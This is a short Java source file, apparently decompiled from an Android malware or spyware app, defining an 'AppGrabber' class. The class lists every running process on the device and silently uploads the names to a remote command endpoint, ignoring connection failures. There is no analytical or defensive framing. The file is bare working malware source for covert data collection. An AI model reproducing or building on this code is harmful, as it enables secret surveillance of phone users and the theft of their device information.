package sx.jolly.grabbers;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.content.Context;
import sx.jolly.exceptions.NoConnectionException;
import sx.jolly.utils.ACRALogSender;
import sx.jolly.utils.Post;
import sx.jolly.utils.Url;
import sx.jolly.utils.Utils;

public class AppGrabber {
    private Context context = null;

    public AppGrabber(Context context) {
        this.context = context;
    }

    public void grab() {
        String body = "";
        for (RunningAppProcessInfo runningAppProcessInfo : ((ActivityManager) this.context.getSystemService("activity")).getRunningAppProcesses()) {
            body = new StringBuilder(String.valueOf(body)).append(runningAppProcessInfo.processName).append(';').toString();
        }
        try {
            new Post(new Url(Utils.CMD_SAVEAPPS, true, false, this.context), body).post();
            Utils.slog(ACRALogSender.class, "apps saved");
        } catch (NoConnectionException e) {
        }
    }
}
